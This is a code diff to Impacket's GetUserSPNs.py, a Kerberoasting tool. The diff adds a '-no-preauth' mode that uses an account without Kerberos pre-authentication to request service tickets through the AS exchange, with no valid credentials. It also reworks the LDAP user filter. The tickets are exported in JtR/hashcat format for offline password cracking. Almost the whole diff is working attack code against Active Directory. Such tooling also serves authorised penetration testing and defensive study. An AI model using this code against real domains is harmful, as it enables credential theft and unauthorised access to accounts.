@@ -26,8 +26,6 @@
 #
 # ToDo:
 #   [X] Add the capability for requesting TGS and output them in JtR/hashcat format
-#   [X] Improve the search filter, we have to specify we don't want machine accounts in the answer
-#       (play with userAccountControl)
 #
 
 from __future__ import division
@@ -45,7 +43,7 @@ from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE, UF_TRUSTED_FOR_DELEGATION
 from impacket.examples import logger
 from impacket.examples.utils import parse_credentials
 from impacket.krb5 import constants
-from impacket.krb5.asn1 import TGS_REP
+from impacket.krb5.asn1 import TGS_REP, AS_REP
 from impacket.krb5.ccache import CCache
 from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
 from impacket.krb5.types import Principal
@@ -80,6 +78,7 @@ class GetUserSPNs:
         self.__targetDomain = target_domain
         self.__lmhash = ''
         self.__nthash = ''
+        self.__no_preauth = cmdLineOptions.no_preauth
         self.__outputFileName = cmdLineOptions.outputfile
         self.__usersFile = cmdLineOptions.usersfile
         self.__aesKey = cmdLineOptions.aesKey
@@ -174,9 +173,11 @@ class GetUserSPNs:
 
         return TGT
 
-    def outputTGS(self, tgs, oldSessionKey, sessionKey, username, spn, fd=None):
-        decodedTGS = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
-
+    def outputTGS(self, ticket, oldSessionKey, sessionKey, username, spn, fd=None):
+        if self.__no_preauth:
+            decodedTGS = decoder.decode(ticket, asn1Spec=AS_REP())[0]
+        else:
+            decodedTGS = decoder.decode(ticket, asn1Spec=TGS_REP())[0]
         # According to RFC4757 (RC4-HMAC) the cipher part is like:
         # struct EDATA {
         #       struct HEADER {
@@ -241,7 +242,7 @@ class GetUserSPNs:
             logging.debug('About to save TGS for %s' % username)
             ccache = CCache()
             try:
-                ccache.fromTGS(tgs, oldSessionKey, sessionKey)
+                ccache.fromTGS(ticket, oldSessionKey, sessionKey)
                 ccache.saveFile('%s.ccache' % username)
             except Exception as e:
                 logging.error(str(e))
@@ -293,13 +294,17 @@ class GetUserSPNs:
                 raise
 
         # Building the search filter
-        searchFilter = "(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512)" \
-                       "(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!(objectCategory=computer))"
+        filter_person = "objectCategory=person"
+        filter_not_disabled = "!(userAccountControl:1.2.840.113556.1.4.803:=2)"
+
+        searchFilter = "(&"
+        searchFilter += "(" + filter_person + ")"
+        searchFilter += "(" + filter_not_disabled + ")"
 
         if self.__requestUser is not None:
-            searchFilter += '(sAMAccountName:=%s))' % self.__requestUser
-        else:
-            searchFilter += ')'
+            searchFilter += '(sAMAccountName:=%s)' % self.__requestUser
+
+        searchFilter += ')'
 
         try:
             resp = ldapConnection.search(searchFilter=searchFilter,
@@ -318,7 +323,6 @@ class GetUserSPNs:
 
         answers = []
         logging.debug('Total of records returned %d' % len(resp))
-
         for item in resp:
             if isinstance(item, ldapasn1.SearchResultEntry) is not True:
                 continue
@@ -417,31 +421,56 @@ class GetUserSPNs:
         self.request_multiple_TGSs(usernames)
 
     def request_multiple_TGSs(self, usernames):
-        # Get a TGT for the current user
-        TGT = self.getTGT()
+        if self.__no_preauth:
+            if self.__outputFileName is not None:
+                fd = open(self.__outputFileName, 'w+')
+            else:
+                fd = None
 
-        if self.__outputFileName is not None:
-            fd = open(self.__outputFileName, 'w+')
+            for username in usernames:
+                try:
+                    no_preauth_pincipal = Principal(self.__no_preauth, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+                    tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(clientName=no_preauth_pincipal,
+                                                                            password=self.__password,
+                                                                            domain=self.__domain,
+                                                                            lmhash=(self.__lmhash),
+                                                                            nthash=(self.__nthash),
+                                                                            aesKey=self.__aesKey,
+                                                                            kdcHost=self.__kdcHost,
+                                                                            service=username)
+                    self.outputTGS(tgt, oldSessionKey, sessionKey, username, username, fd)
+                except Exception as e:
+                    logging.debug("Exception:", exc_info=True)
+                    logging.error('Principal: %s - %s' % (username, str(e)))
+
+            if fd is not None:
+                fd.close()
         else:
-            fd = None
+            # Get a TGT for the current user
+            TGT = self.getTGT()
 
-        for username in usernames:
-            try:
-                principalName = Principal()
-                principalName.type = constants.PrincipalNameType.NT_ENTERPRISE.value
-                principalName.components = [username]
+            if self.__outputFileName is not None:
+                fd = open(self.__outputFileName, 'w+')
+            else:
+                fd = None
 
-                tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(principalName, self.__domain,
-                                                                        self.__kdcHost,
-                                                                        TGT['KDC_REP'], TGT['cipher'],
-                                                                        TGT['sessionKey'])
-                self.outputTGS(tgs, oldSessionKey, sessionKey, username, username, fd)
-            except Exception as e:
-                logging.debug("Exception:", exc_info=True)
-                logging.error('Principal: %s - %s' % (username, str(e)))
+            for username in usernames:
+                try:
+                    principalName = Principal()
+                    principalName.type = constants.PrincipalNameType.NT_ENTERPRISE.value
+                    principalName.components = [username]
 
-        if fd is not None:
-            fd.close()
+                    tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(principalName, self.__domain,
+                                                                            self.__kdcHost,
+                                                                            TGT['KDC_REP'], TGT['cipher'],
+                                                                            TGT['sessionKey'])
+                    self.outputTGS(tgs, oldSessionKey, sessionKey, username, username, fd)
+                except Exception as e:
+                    logging.debug("Exception:", exc_info=True)
+                    logging.error('Principal: %s - %s' % (username, str(e)))
+
+            if fd is not None:
+                fd.close()
 
 
 # Process command-line arguments.
@@ -455,6 +484,8 @@ if __name__ == '__main__':
     parser.add_argument('-target-domain', action='store',
                         help='Domain to query/request if different than the domain of the user. '
                              'Allows for Kerberoasting across trusts.')
+    parser.add_argument('-no-preauth', action='store', help='account that does not require preauth, to obtain Service Ticket'
+                                                         ' through the AS')
     parser.add_argument('-usersfile', help='File with user per line to test')
     parser.add_argument('-request', action='store_true', default=False, help='Requests TGS for users and output them '
                                                                              'in JtR/hashcat format (default False)')
@@ -496,6 +527,11 @@ if __name__ == '__main__':
 
     # Init the example's logger theme
     logger.init(options.ts)
+
+    if options.no_preauth and options.usersfile is None:
+        logging.error('You have to specify -usersfile when -no-preauth is supplied. Usersfile must contain'
+                      ' a list of SPNs and/or sAMAccountNames to Kerberoast.')
+        sys.exit(1)
 
     if options.debug is True:
         logging.getLogger().setLevel(logging.DEBUG)
